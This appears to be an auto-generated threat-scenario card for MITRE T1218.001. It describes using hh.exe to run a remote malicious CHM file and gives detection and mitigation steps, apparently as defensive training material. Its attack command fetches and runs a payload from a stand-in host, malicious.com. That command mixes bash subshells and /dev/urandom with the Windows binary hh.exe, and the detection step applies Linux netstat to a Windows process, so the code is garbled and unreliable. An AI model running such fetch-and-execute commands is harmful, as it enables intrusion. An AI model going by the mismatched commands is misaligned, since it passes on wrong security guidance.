---
type: campaign
scenario_id: 70
tactic: Defense Evasion
technique: "T1218.001: Compiled HTML File"
technique_id: T1218.001
tags: [campaign, lotl, defense_evasion]
---

# Using hh.exe to execute malicious CHM file.

## Threat Description
Using hh.exe to execute malicious CHM file.

## Attack Command
```
hh http://malicious.com/$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm)
```

## Detection Logic
Monitor hh.exe network activity: `netstat -anp | grep hh`; YARA rule: `rule HhRemote { strings: $a = /hh.*http/ nocase; condition: $a }`

## Mitigation
Block hh.exe network access: `netsh advfirewall firewall add rule name='Block hh' dir=out program='%windir%\hh.exe' action=block`; Disable CHM execution: AppLocker.

## AI Training Prompt
Train AI to detect hh.exe CHM execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
